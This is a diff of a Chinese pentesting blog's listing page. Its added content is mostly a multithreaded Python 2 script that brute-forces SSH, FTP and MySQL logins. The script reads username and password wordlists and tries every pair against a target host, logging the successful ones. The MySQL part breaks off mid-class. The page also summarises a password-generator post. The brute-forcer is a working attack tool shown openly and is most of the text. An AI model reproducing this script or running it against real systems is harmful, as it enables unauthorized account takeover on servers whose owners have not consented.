@@ -1,258 +1,488 @@
-<!DOCTYPE html>
-<html lang="en">
-  <head>
-	<meta name="generator" content="Hugo 0.120.3">
-  <meta charset="utf-8" />
-  <meta name="viewport" content="width=device-width, initial-scale=1" />
-  <meta name="description" content=""/>
-  <meta name="author" content="Reber"/>
-  
-    
-      <title>Reber&#39;s Blog</title>
-    
-  
-  <link rel="stylesheet" href="/css/reset.css"/>
-  
-  <link rel="stylesheet" href="/css/smigle.css"/>
-  
-    <link rel="stylesheet" href="/css/monokai-sublime.min.css"/>
-  
-    <link rel="stylesheet" href="/css/style.css"/>
-  
-  
-    <script src="/js/jquery-3.6.0.min.js"/></script>
-  
-    <script src="/js/highlight.min.js"/></script>
-  
-    <script src="/js/style.js"/></script>
-  
-  <link rel="icon" type="image/img" sizes="16x16" href="/img/logo.png">
-  <meta name="msapplication-TileColor" content="#da532c">
-  <meta name="theme-color" content="#ffffff">
-</head>
+<!doctype html><html lang=en><head><meta name=generator content="Hugo 0.140.2"><meta charset=utf-8><meta name=viewport content="width=device-width,initial-scale=1"><meta name=description content><meta name=author content="Reber"><title>Reber's Blog</title>
+<link rel=stylesheet href=/css/reset.css><link rel=stylesheet href=/css/smigle.css><link rel=stylesheet href=/css/monokai-sublime.min.css><link rel=stylesheet href=/css/style.css><script src=/js/jquery-3.6.0.min.js></script><script src=/js/highlight.min.js></script><script src=/js/style.js></script><link rel=icon type=image/img sizes=16x16 href=/img/logo.png><meta name=msapplication-TileColor content="#da532c"><meta name=theme-color content="#ffffff"></head><body><header><div id=brand><a class=icon-link href=https://wyb0.com/><img class=icon src=/img/logo.png></a><div class=text><a href=https://wyb0.com/><h1>Reber's Blog</h1></a><h3>会一点点编程、会一点点渗透</h3></div></div><nav><a href=/><b>Home</b></a>
+|
+<a href=/posts/><b>Posts</b></a>
+|
+<a href=/categories/><b>Categories</b></a>
+|
+<a href=/tags/><b>Tags</b></a>
+|
+<a href=/about/><b>About</b></a>
+|
+<a href=/friends/><b>Friends</b></a></nav><hr></header><div id=content><main><article><h1 class=summary-title><a href=https://wyb0.com/posts/2016/python-password-generator/>Python 实现密码生成器</a></h1><div class=post-meta><time>2016-08-29</time>
+[<a href=/categories/Python>Python</a>](<a href=/tags/python>python</a>)</div><div class=summary-body><p><h3 id=0x00-简介>0x00 简介</h3><p>有时候需要在网上注册许多账号，如果每个账户密码都一样的话，若被别人得知一个密码则所有账户就都沦陷了，若密码不一样则可能会忘记，在这里就用脚本写一个生成密码的工具，只需输入域名和账户名就可以根据key生成不一样的密码，也可以把域名和账户名写入文件，这样你用户名也可以不用记了。。。</p><a href=https://wyb0.com/posts/2016/python-password-generator/>more...</a></p></div></article><article><h1 class=summary-title><a href=https://wyb0.com/posts/2016/python-multi-threaded-weak-password-blasting/>Python 实现多线程弱口令爆破</a></h1><div class=post-meta><time>2016-08-26</time>
+[<a href=/categories/Pentest>Pentest</a>,<a href=/categories/Python>Python</a>](<a href=/tags/python>python</a>,<a href=/tags/%E7%88%86%E7%A0%B4>爆破</a>)</div><div class=summary-body><p><h3 id=0x00-脚本>0x00 脚本</h3><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=display:flex><span><span style=color:#75715e>#!/usr/bin/env python</span>
+</span></span><span style=display:flex><span><span style=color:#75715e># -*- coding: utf-8 -*-</span>
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#e6db74>&#39;this script can bruter ftp/ssh/mysql&#39;</span>
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>__author__ <span style=color:#f92672>=</span> <span style=color:#e6db74>&#39;reber&#39;</span>
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#f92672>import</span> Queue
+</span></span><span style=display:flex><span><span style=color:#f92672>import</span> threading
+</span></span><span style=display:flex><span><span style=color:#f92672>import</span> time
+</span></span><span style=display:flex><span><span style=color:#f92672>import</span> logging
+</span></span><span style=display:flex><span><span style=color:#f92672>import</span> socket
+</span></span><span style=display:flex><span><span style=color:#f92672>from</span> optparse <span style=color:#f92672>import</span> OptionParser
+</span></span><span style=display:flex><span><span style=color:#f92672>import</span> paramiko
+</span></span><span style=display:flex><span><span style=color:#f92672>from</span> ftplib <span style=color:#f92672>import</span> FTP
+</span></span><span style=display:flex><span><span style=color:#f92672>import</span> MySQLdb
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#75715e>#################公有类#################</span>
+</span></span><span style=display:flex><span><span style=color:#66d9ef>class</span> <span style=color:#a6e22e>CommonFun</span>(object):
+</span></span><span style=display:flex><span>    <span style=color:#e6db74>&#34;&#34;&#34;docstring for CommonFun&#34;&#34;&#34;</span>
+</span></span><span style=display:flex><span>    <span style=color:#66d9ef>def</span> __init__(self):
+</span></span><span style=display:flex><span>        super(CommonFun, self)<span style=color:#f92672>.</span>__init__()
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>    <span style=color:#66d9ef>def</span> <span style=color:#a6e22e>set_log</span>(self,lname):
+</span></span><span style=display:flex><span>        logger <span style=color:#f92672>=</span> logging<span style=color:#f92672>.</span>getLogger(lname)
+</span></span><span style=display:flex><span>        logger<span style=color:#f92672>.</span>setLevel(logging<span style=color:#f92672>.</span>DEBUG)
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>        ch <span style=color:#f92672>=</span> logging<span style=color:#f92672>.</span>StreamHandler()
+</span></span><span style=display:flex><span>        ch<span style=color:#f92672>.</span>setLevel(logging<span style=color:#f92672>.</span>DEBUG)
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>        formatter <span style=color:#f92672>=</span> logging<span style=color:#f92672>.</span>Formatter(<span style=color:#e6db74>&#39;</span><span style=color:#e6db74>%(asctime)s</span><span style=color:#e6db74> - </span><span style=color:#e6db74>%(name)s</span><span style=color:#e6db74> - </span><span style=color:#e6db74>%(levelname)s</span><span style=color:#e6db74> - </span><span style=color:#e6db74>%(message)s</span><span style=color:#e6db74>&#39;</span>)
+</span></span><span style=display:flex><span>        ch<span style=color:#f92672>.</span>setFormatter(formatter)
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>        logger<span style=color:#f92672>.</span>addHandler(ch)
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>    <span style=color:#66d9ef>def</span> <span style=color:#a6e22e>show_log</span>(self, lname, msg):
+</span></span><span style=display:flex><span>        a <span style=color:#f92672>=</span> logging<span style=color:#f92672>.</span>getLogger(lname)
+</span></span><span style=display:flex><span>        a<span style=color:#f92672>.</span>debug(msg)
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>    <span style=color:#66d9ef>def</span> <span style=color:#a6e22e>show_result</span>(self, lname, rlist):
+</span></span><span style=display:flex><span>        <span style=color:#66d9ef>if</span> rlist:
+</span></span><span style=display:flex><span>            print <span style=color:#e6db74>&#34;###################################################################&#34;</span>
+</span></span><span style=display:flex><span>            <span style=color:#66d9ef>for</span> x <span style=color:#f92672>in</span> rlist:
+</span></span><span style=display:flex><span>                self<span style=color:#f92672>.</span>show_log(lname,x)
+</span></span><span style=display:flex><span>        <span style=color:#66d9ef>else</span>:
+</span></span><span style=display:flex><span>            print <span style=color:#e6db74>&#34;not found...&#34;</span>
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#75715e>#################SSH爆破模块#################</span>
+</span></span><span style=display:flex><span><span style=color:#66d9ef>class</span> <span style=color:#a6e22e>SshBruter</span>(CommonFun):
+</span></span><span style=display:flex><span>    <span style=color:#e6db74>&#34;&#34;&#34;docstring for SshBruter&#34;&#34;&#34;</span>
+</span></span><span style=display:flex><span>    <span style=color:#66d9ef>def</span> __init__(self, <span style=color:#f92672>*</span>args):
+</span></span><span style=display:flex><span>        super(SshBruter, self)<span style=color:#f92672>.</span>__init__()
+</span></span><span style=display:flex><span>        (options,arg) <span style=color:#f92672>=</span> args
+</span></span><span style=display:flex><span>        self<span style=color:#f92672>.</span>host <span style=color:#f92672>=</span> options<span style=color:#f92672>.</span>host
+</span></span><span style=display:flex><span>        self<span style=color:#f92672>.</span>userfile <span style=color:#f92672>=</span> options<span style=color:#f92672>.</span>userfile
+</span></span><span style=display:flex><span>        self<span style=color:#f92672>.</span>passfile <span style=color:#f92672>=</span> options<span style=color:#f92672>.</span>passfile
+</span></span><span style=display:flex><span>        self<span style=color:#f92672>.</span>threadnum <span style=color:#f92672>=</span> options<span style=color:#f92672>.</span>threadnum
+</span></span><span style=display:flex><span>        self<span style=color:#f92672>.</span>timeout <span style=color:#f92672>=</span> options<span style=color:#f92672>.</span>timeout
+</span></span><span style=display:flex><span>        self<span style=color:#f92672>.</span>result <span style=color:#f92672>=</span> []
+</span></span><span style=display:flex><span>        self<span style=color:#f92672>.</span>set_log(self<span style=color:#f92672>.</span>host)
+</span></span><span style=display:flex><span>        self<span style=color:#f92672>.</span>qlist <span style=color:#f92672>=</span> Queue<span style=color:#f92672>.</span>Queue()
+</span></span><span style=display:flex><span>        self<span style=color:#f92672>.</span>is_exit <span style=color:#f92672>=</span> <span style=color:#66d9ef>False</span>
+</span></span><span style=display:flex><span>        print self<span style=color:#f92672>.</span>host,self<span style=color:#f92672>.</span>userfile,self<span style=color:#f92672>.</span>passfile,self<span style=color:#f92672>.</span>threadnum
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>    <span style=color:#66d9ef>def</span> <span style=color:#a6e22e>get_queue</span>(self):
+</span></span><span style=display:flex><span>        <span style=color:#66d9ef>with</span> open(self<span style=color:#f92672>.</span>userfile, <span style=color:#e6db74>&#39;r&#39;</span>) <span style=color:#66d9ef>as</span> f:
+</span></span><span style=display:flex><span>            ulines <span style=color:#f92672>=</span> f<span style=color:#f92672>.</span>readlines()
+</span></span><span style=display:flex><span>        <span style=color:#66d9ef>with</span> open(self<span style=color:#f92672>.</span>passfile, <span style=color:#e6db74>&#39;r&#39;</span>) <span style=color:#66d9ef>as</span> f:
+</span></span><span style=display:flex><span>            plines <span style=color:#f92672>=</span> f<span style=color:#f92672>.</span>readlines()
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>        <span style=color:#66d9ef>for</span> name <span style=color:#f92672>in</span> ulines:
+</span></span><span style=display:flex><span>            <span style=color:#66d9ef>for</span> pwd <span style=color:#f92672>in</span> plines:
+</span></span><span style=display:flex><span>                name <span style=color:#f92672>=</span> name<span style=color:#f92672>.</span>strip()
+</span></span><span style=display:flex><span>                pwd <span style=color:#f92672>=</span> pwd<span style=color:#f92672>.</span>strip()
+</span></span><span style=display:flex><span>                self<span style=color:#f92672>.</span>qlist<span style=color:#f92672>.</span>put(name <span style=color:#f92672>+</span> <span style=color:#e6db74>&#39;:&#39;</span> <span style=color:#f92672>+</span> pwd)
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>    <span style=color:#66d9ef>def</span> <span style=color:#a6e22e>thread</span>(self):        
+</span></span><span style=display:flex><span>        <span style=color:#66d9ef>while</span> <span style=color:#f92672>not</span> self<span style=color:#f92672>.</span>qlist<span style=color:#f92672>.</span>empty():
+</span></span><span style=display:flex><span>            <span style=color:#66d9ef>if</span> <span style=color:#f92672>not</span> self<span style=color:#f92672>.</span>is_exit:
+</span></span><span style=display:flex><span>                name,pwd <span style=color:#f92672>=</span> self<span style=color:#f92672>.</span>qlist<span style=color:#f92672>.</span>get()<span style=color:#f92672>.</span>split(<span style=color:#e6db74>&#39;:&#39;</span>)
+</span></span><span style=display:flex><span>                <span style=color:#66d9ef>try</span>:
+</span></span><span style=display:flex><span>                    ssh <span style=color:#f92672>=</span> paramiko<span style=color:#f92672>.</span>SSHClient()
+</span></span><span style=display:flex><span>                    ssh<span style=color:#f92672>.</span>set_missing_host_key_policy(paramiko<span style=color:#f92672>.</span>AutoAddPolicy())
+</span></span><span style=display:flex><span>                    ssh<span style=color:#f92672>.</span>connect(hostname<span style=color:#f92672>=</span>self<span style=color:#f92672>.</span>host,port<span style=color:#f92672>=</span><span style=color:#ae81ff>22</span>,username<span style=color:#f92672>=</span>name,password<span style=color:#f92672>=</span>pwd,timeout<span style=color:#f92672>=</span>self<span style=color:#f92672>.</span>timeout)
+</span></span><span style=display:flex><span>                    time<span style=color:#f92672>.</span>sleep(<span style=color:#ae81ff>0.05</span>)
+</span></span><span style=display:flex><span>                    ssh<span style=color:#f92672>.</span>close()
+</span></span><span style=display:flex><span>                    s <span style=color:#f92672>=</span> <span style=color:#e6db74>&#34;[OK] </span><span style=color:#e6db74>%s</span><span style=color:#e6db74>:</span><span style=color:#e6db74>%s</span><span style=color:#e6db74>&#34;</span> <span style=color:#f92672>%</span> (name,pwd)
+</span></span><span style=display:flex><span>                    self<span style=color:#f92672>.</span>show_log(self<span style=color:#f92672>.</span>host,s)
+</span></span><span style=display:flex><span>                    self<span style=color:#f92672>.</span>result<span style=color:#f92672>.</span>append(s)
+</span></span><span style=display:flex><span>                <span style=color:#66d9ef>except</span> socket<span style=color:#f92672>.</span>timeout:
+</span></span><span style=display:flex><span>                    self<span style=color:#f92672>.</span>show_log(self<span style=color:#f92672>.</span>host,<span style=color:#e6db74>&#34;Timeout...&#34;</span>)
+</span></span><span style=display:flex><span>                    self<span style=color:#f92672>.</span>qlist<span style=color:#f92672>.</span>put(name <span style=color:#f92672>+</span> <span style=color:#e6db74>&#39;:&#39;</span> <span style=color:#f92672>+</span> pwd)
+</span></span><span style=display:flex><span>                    time<span style=color:#f92672>.</span>sleep(<span style=color:#ae81ff>3</span>)
+</span></span><span style=display:flex><span>                <span style=color:#66d9ef>except</span> <span style=color:#a6e22e>Exception</span>, e:
+</span></span><span style=display:flex><span>                    error <span style=color:#f92672>=</span> <span style=color:#e6db74>&#34;[Error] </span><span style=color:#e6db74>%s</span><span style=color:#e6db74>:</span><span style=color:#e6db74>%s</span><span style=color:#e6db74>&#34;</span> <span style=color:#f92672>%</span> (name,pwd)
+</span></span><span style=display:flex><span>                    self<span style=color:#f92672>.</span>show_log(self<span style=color:#f92672>.</span>host,error)
+</span></span><span style=display:flex><span>                    <span style=color:#66d9ef>pass</span>
+</span></span><span style=display:flex><span>            <span style=color:#66d9ef>else</span>:
+</span></span><span style=display:flex><span>                <span style=color:#66d9ef>break</span>
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>    <span style=color:#66d9ef>def</span> <span style=color:#a6e22e>run</span>(self):
+</span></span><span style=display:flex><span>        self<span style=color:#f92672>.</span>get_queue()
+</span></span><span style=display:flex><span>        starttime <span style=color:#f92672>=</span> time<span style=color:#f92672>.</span>time()
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>        threads <span style=color:#f92672>=</span> []
+</span></span><span style=display:flex><span>        <span style=color:#66d9ef>for</span> x <span style=color:#f92672>in</span> xrange(<span style=color:#ae81ff>1</span>,self<span style=color:#f92672>.</span>threadnum<span style=color:#f92672>+</span><span style=color:#ae81ff>1</span>):
+</span></span><span style=display:flex><span>            t <span style=color:#f92672>=</span> threading<span style=color:#f92672>.</span>Thread(target<span style=color:#f92672>=</span>self<span style=color:#f92672>.</span>thread)
+</span></span><span style=display:flex><span>            threads<span style=color:#f92672>.</span>append(t)
+</span></span><span style=display:flex><span>            t<span style=color:#f92672>.</span>setDaemon(<span style=color:#66d9ef>True</span>) <span style=color:#75715e>#主线程完成后不管子线程有没有结束，直接退出</span>
+</span></span><span style=display:flex><span>            t<span style=color:#f92672>.</span>start()
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>        <span style=color:#66d9ef>try</span>:
+</span></span><span style=display:flex><span>            <span style=color:#66d9ef>while</span> <span style=color:#66d9ef>True</span>:
+</span></span><span style=display:flex><span>                <span style=color:#66d9ef>if</span> self<span style=color:#f92672>.</span>qlist<span style=color:#f92672>.</span>empty():
+</span></span><span style=display:flex><span>                    <span style=color:#66d9ef>break</span>
+</span></span><span style=display:flex><span>                <span style=color:#66d9ef>else</span>:
+</span></span><span style=display:flex><span>                    time<span style=color:#f92672>.</span>sleep(<span style=color:#ae81ff>1</span>)
+</span></span><span style=display:flex><span>        <span style=color:#66d9ef>except</span> <span style=color:#a6e22e>KeyboardInterrupt</span>:
+</span></span><span style=display:flex><span>            self<span style=color:#f92672>.</span>is_exit <span style=color:#f92672>=</span> <span style=color:#66d9ef>True</span>
+</span></span><span style=display:flex><span>            print <span style=color:#e6db74>&#34;Exit the program...&#34;</span>
+</span></span><span style=display:flex><span>        print <span style=color:#e6db74>&#34;Waiting...&#34;</span>
+</span></span><span style=display:flex><span>        time<span style=color:#f92672>.</span>sleep(<span style=color:#ae81ff>5</span>)
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>        self<span style=color:#f92672>.</span>show_result(self<span style=color:#f92672>.</span>host,self<span style=color:#f92672>.</span>result)
+</span></span><span style=display:flex><span>        finishetime <span style=color:#f92672>=</span> time<span style=color:#f92672>.</span>time()
+</span></span><span style=display:flex><span>        print <span style=color:#e6db74>&#34;Used time: </span><span style=color:#e6db74>%f</span><span style=color:#e6db74>&#34;</span> <span style=color:#f92672>%</span> (finishetime<span style=color:#f92672>-</span>starttime)
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#75715e>#################FTP爆破模块#################</span>
+</span></span><span style=display:flex><span><span style=color:#66d9ef>class</span> <span style=color:#a6e22e>FtpBruter</span>(CommonFun):
+</span></span><span style=display:flex><span>    <span style=color:#e6db74>&#34;&#34;&#34;docstring for FtpBruter&#34;&#34;&#34;</span>
+</span></span><span style=display:flex><span>    <span style=color:#66d9ef>def</span> __init__(self, <span style=color:#f92672>*</span>args):
+</span></span><span style=display:flex><span>        super(FtpBruter, self)<span style=color:#f92672>.</span>__init__()
+</span></span><span style=display:flex><span>        (options,arg) <span style=color:#f92672>=</span> args
+</span></span><span style=display:flex><span>        self<span style=color:#f92672>.</span>host <span style=color:#f92672>=</span> options<span style=color:#f92672>.</span>host
+</span></span><span style=display:flex><span>        self<span style=color:#f92672>.</span>userfile <span style=color:#f92672>=</span> options<span style=color:#f92672>.</span>userfile
+</span></span><span style=display:flex><span>        self<span style=color:#f92672>.</span>passfile <span style=color:#f92672>=</span> options<span style=color:#f92672>.</span>passfile
+</span></span><span style=display:flex><span>        self<span style=color:#f92672>.</span>threadnum <span style=color:#f92672>=</span> options<span style=color:#f92672>.</span>threadnum
+</span></span><span style=display:flex><span>        self<span style=color:#f92672>.</span>timeout <span style=color:#f92672>=</span> options<span style=color:#f92672>.</span>timeout
+</span></span><span style=display:flex><span>        self<span style=color:#f92672>.</span>result <span style=color:#f92672>=</span> []
+</span></span><span style=display:flex><span>        self<span style=color:#f92672>.</span>set_log(self<span style=color:#f92672>.</span>host)
+</span></span><span style=display:flex><span>        self<span style=color:#f92672>.</span>qlist <span style=color:#f92672>=</span> Queue<span style=color:#f92672>.</span>Queue()
+</span></span><span style=display:flex><span>        print self<span style=color:#f92672>.</span>host,self<span style=color:#f92672>.</span>userfile,self<span style=color:#f92672>.</span>passfile,self<span style=color:#f92672>.</span>threadnum
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>    <span style=color:#66d9ef>def</span> <span style=color:#a6e22e>get_queue</span>(self):
+</span></span><span style=display:flex><span>        <span style=color:#66d9ef>with</span> open(self<span style=color:#f92672>.</span>userfile, <span style=color:#e6db74>&#39;r&#39;</span>) <span style=color:#66d9ef>as</span> f:
+</span></span><span style=display:flex><span>            ulines <span style=color:#f92672>=</span> f<span style=color:#f92672>.</span>readlines()
+</span></span><span style=display:flex><span>        <span style=color:#66d9ef>with</span> open(self<span style=color:#f92672>.</span>passfile, <span style=color:#e6db74>&#39;r&#39;</span>) <span style=color:#66d9ef>as</span> f:
+</span></span><span style=display:flex><span>            plines <span style=color:#f92672>=</span> f<span style=color:#f92672>.</span>readlines()
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>        <span style=color:#66d9ef>for</span> name <span style=color:#f92672>in</span> ulines:
+</span></span><span style=display:flex><span>            <span style=color:#66d9ef>for</span> pwd <span style=color:#f92672>in</span> plines:
+</span></span><span style=display:flex><span>                name <span style=color:#f92672>=</span> name<span style=color:#f92672>.</span>strip()
+</span></span><span style=display:flex><span>                pwd <span style=color:#f92672>=</span> pwd<span style=color:#f92672>.</span>strip()
+</span></span><span style=display:flex><span>                self<span style=color:#f92672>.</span>qlist<span style=color:#f92672>.</span>put(name <span style=color:#f92672>+</span> <span style=color:#e6db74>&#39;:&#39;</span> <span style=color:#f92672>+</span> pwd)
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>    <span style=color:#66d9ef>def</span> <span style=color:#a6e22e>thread</span>(self):
+</span></span><span style=display:flex><span>        <span style=color:#66d9ef>while</span> <span style=color:#f92672>not</span> self<span style=color:#f92672>.</span>qlist<span style=color:#f92672>.</span>empty():
+</span></span><span style=display:flex><span>            name,pwd <span style=color:#f92672>=</span> self<span style=color:#f92672>.</span>qlist<span style=color:#f92672>.</span>get()<span style=color:#f92672>.</span>split(<span style=color:#e6db74>&#39;:&#39;</span>)
+</span></span><span style=display:flex><span>            <span style=color:#66d9ef>try</span>:
+</span></span><span style=display:flex><span>                ftp <span style=color:#f92672>=</span> FTP()
+</span></span><span style=display:flex><span>                ftp<span style=color:#f92672>.</span>connect(self<span style=color:#f92672>.</span>host, <span style=color:#ae81ff>21</span>, self<span style=color:#f92672>.</span>timeout)
+</span></span><span style=display:flex><span>                ftp<span style=color:#f92672>.</span>login(name, pwd)
+</span></span><span style=display:flex><span>                time<span style=color:#f92672>.</span>sleep(<span style=color:#ae81ff>0.05</span>)
+</span></span><span style=display:flex><span>                ftp<span style=color:#f92672>.</span>quit()
+</span></span><span style=display:flex><span>                s <span style=color:#f92672>=</span> <span style=color:#e6db74>&#34;[OK] </span><span style=color:#e6db74>%s</span><span style=color:#e6db74>:</span><span style=color:#e6db74>%s</span><span style=color:#e6db74>&#34;</span> <span style=color:#f92672>%</span> (name,pwd)
+</span></span><span style=display:flex><span>                self<span style=color:#f92672>.</span>show_log(self<span style=color:#f92672>.</span>host,s)
+</span></span><span style=display:flex><span>                self<span style=color:#f92672>.</span>result<span style=color:#f92672>.</span>append(s)
+</span></span><span style=display:flex><span>            <span style=color:#66d9ef>except</span> socket<span style=color:#f92672>.</span>timeout:
+</span></span><span style=display:flex><span>                self<span style=color:#f92672>.</span>show_log(self<span style=color:#f92672>.</span>host,<span style=color:#e6db74>&#34;Timeout...&#34;</span>)
+</span></span><span style=display:flex><span>                self<span style=color:#f92672>.</span>qlist<span style=color:#f92672>.</span>put(name <span style=color:#f92672>+</span> <span style=color:#e6db74>&#39;:&#39;</span> <span style=color:#f92672>+</span> pwd)
+</span></span><span style=display:flex><span>                time<span style=color:#f92672>.</span>sleep(<span style=color:#ae81ff>1</span>)
+</span></span><span style=display:flex><span>            <span style=color:#66d9ef>except</span> <span style=color:#a6e22e>Exception</span>, e:
+</span></span><span style=display:flex><span>                error <span style=color:#f92672>=</span> <span style=color:#e6db74>&#34;[Error] </span><span style=color:#e6db74>%s</span><span style=color:#e6db74>:</span><span style=color:#e6db74>%s</span><span style=color:#e6db74>&#34;</span> <span style=color:#f92672>%</span> (name,pwd)
+</span></span><span style=display:flex><span>                self<span style=color:#f92672>.</span>show_log(self<span style=color:#f92672>.</span>host,error)
+</span></span><span style=display:flex><span>                <span style=color:#66d9ef>pass</span>
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>    <span style=color:#66d9ef>def</span> <span style=color:#a6e22e>run</span>(self):
+</span></span><span style=display:flex><span>        self<span style=color:#f92672>.</span>get_queue()
+</span></span><span style=display:flex><span>        starttime <span style=color:#f92672>=</span> time<span style=color:#f92672>.</span>time()
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>        threads <span style=color:#f92672>=</span> []
+</span></span><span style=display:flex><span>        <span style=color:#66d9ef>for</span> x <span style=color:#f92672>in</span> xrange(<span style=color:#ae81ff>1</span>,self<span style=color:#f92672>.</span>threadnum<span style=color:#f92672>+</span><span style=color:#ae81ff>1</span>):
+</span></span><span style=display:flex><span>            t <span style=color:#f92672>=</span> threading<span style=color:#f92672>.</span>Thread(target<span style=color:#f92672>=</span>self<span style=color:#f92672>.</span>thread)
+</span></span><span style=display:flex><span>            threads<span style=color:#f92672>.</span>append(t)
+</span></span><span style=display:flex><span>            t<span style=color:#f92672>.</span>setDaemon(<span style=color:#66d9ef>True</span>) <span style=color:#75715e>#主线程完成后不管子线程有没有结束，直接退出</span>
+</span></span><span style=display:flex><span>            t<span style=color:#f92672>.</span>start()
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>        <span style=color:#66d9ef>try</span>:
+</span></span><span style=display:flex><span>            <span style=color:#66d9ef>while</span> <span style=color:#66d9ef>True</span>:
+</span></span><span style=display:flex><span>                <span style=color:#66d9ef>if</span> self<span style=color:#f92672>.</span>qlist<span style=color:#f92672>.</span>empty():
+</span></span><span style=display:flex><span>                    <span style=color:#66d9ef>break</span>
+</span></span><span style=display:flex><span>                <span style=color:#66d9ef>else</span>:
+</span></span><span style=display:flex><span>                    time<span style=color:#f92672>.</span>sleep(<span style=color:#ae81ff>1</span>)
+</span></span><span style=display:flex><span>        <span style=color:#66d9ef>except</span> <span style=color:#a6e22e>KeyboardInterrupt</span>:
+</span></span><span style=display:flex><span>            self<span style=color:#f92672>.</span>is_exit <span style=color:#f92672>=</span> <span style=color:#66d9ef>True</span>
+</span></span><span style=display:flex><span>            print <span style=color:#e6db74>&#34;Exit the program...&#34;</span>
+</span></span><span style=display:flex><span>        print <span style=color:#e6db74>&#34;Waiting...&#34;</span>
+</span></span><span style=display:flex><span>        time<span style=color:#f92672>.</span>sleep(<span style=color:#ae81ff>5</span>)
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>        self<span style=color:#f92672>.</span>show_result(self<span style=color:#f92672>.</span>host,self<span style=color:#f92672>.</span>result)
+</span></span><span style=display:flex><span>        finishetime <span style=color:#f92672>=</span> time<span style=color:#f92672>.</span>time()
+</span></span><span style=display:flex><span>        print <span style=color:#e6db74>&#34;Used time: </span><span style=color:#e6db74>%f</span><span style=color:#e6db74>&#34;</span> <span style=color:#f92672>%</span> (finishetime<span style=color:#f92672>-</span>starttime)
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#75715e>#################MySQL爆破模块#################</span>
+</span></span><span style=display:flex><span><span style=color:#66d9ef>class</span> <span style=color:#a6e22e>MysqlBruter</span>(CommonFun):
+</span></span><span style=display:flex><span>    <span style=color:#e6db74>&#34;&#34;&#34;docstring for MysqlBruter&#34;&#34;&#34;</span>
+</span></span><span style=display:flex><span>    <span style=color:#66d9ef>def</span> __init__(self, <span style=color:#f92672>*</span>args):
+</span></span><span style=display:flex><span>        super(MysqlBruter, self)<span style=color:#f92672>.</span>__init__()
+</span></span><span style=display:flex><span>        (options,arg) <span style=color:#f92672>=</span> args
+</span></span><span style=display:flex><span>        self<span style=color:#f92672>.</span>host <span style=color:#f92672>=</span> options<span style=color:#f92672>.</span>host
+</span></span><span style=display:flex><span>        self<span style=color:#f92672>.</span>userfile <span style=color:#f92672>=</span> options<span style=color:#f92672>.</span>userfile
+</span></span><span style=display:flex><span>        self<span style=color:#f92672>.</span>passfile <span style=color:#f92672>=</span> options<span style=color:#f92672>.</span>passfile
+</span></span><span style=display:flex><span>        self<span style=color:#f92672>.</span>threadnum <span style=color:#f92672>=</span> options<span style=color:#f92672>.</span>threadnum
+</span></span><span style=display:flex><span>        self<span style=color:#f92672>.</span>timeout <span style=color:#f92672>=</span> options<span style=color:#f92672>.</span>timeout
+</span></span><span style=display:flex><span>        self<span style=color:#f92672>.</span>result <span style=color:#f92672>=</span> []
+</span></span><span style=display:flex><span>        self<span style=color:#f92672>.</span>set_log(self<span style=color:#f92672>.</span>host)
+</span></span><span style=display:flex><span>        self<span style=color:#f92672>.</span>qlist <span style=color:#f92672>=</span> Queue<span style=color:#f92672>.</span>Queue()
+</span></span><span style=display:flex><span>        print self<span style=color:#f92672>.</span>host,self<span style=color:#f92672>.</span>userfile,self<span style=color:#f92672>.</span>passfile,self<span style=color:#f92672>.</span>threadnum
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>    <span style=color:#66d9ef>def</span> <span style=color:#a6e22e>get_queue</span>(self):
+</span></span><span style=display:flex><span>        <span style=color:#66d9ef>with</span> open(self<span style=color:#f92672>.</span>userfile, <span style=color:#e6db74>&#39;r&#39;</span>) <span style=color:#66d9ef>as</span> f:
+</span></span><span style=display:flex><span>            ulines <span style=color:#f92672>=</span> f<span style=color:#f92672>.</span>readlines()
+</span></span><span style=display:flex><span>        <span style=color:#66d9ef>with</span> open(self<span style=color:#f92672>.</span>passfile, <span style=color:#e6db74>&#39;r&#39;</span>) <span style=color:#66d9ef>as</span> f:
+</span></span><span style=display:flex><span>            plines <span style=color:#f92672>=</span> f<span style=color:#f92672>.</span>readlines()
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>        <span style=color:#66d9ef>for</span> name <span style=color:#f92672>in</span> ulines:
+</span></span><span style=display:flex><span>            <span style=color:#66d9ef>for</span> pwd <span style=color:#f92672>in</span> plines:
+</span></span><span style=display:flex><span>                name <span style=color:#f92672>=</span> name<span style=color:#f92672>.</span>strip()
+</span></span><span style=display:flex><span>                pwd <span style=color:#f92672>=</span> pwd<span style=color:#f92672>.</span>strip()
+</span></span><span style=display:flex><span>                self<span style=color:#f92672>.</span>qlist<span style=color:#f92672>.</span>put(name <span style=color:#f92672>+</span> <span style=color:#e6db74>&#39;:&#39;</span> <span style=color:#f92672>+</span> pwd)
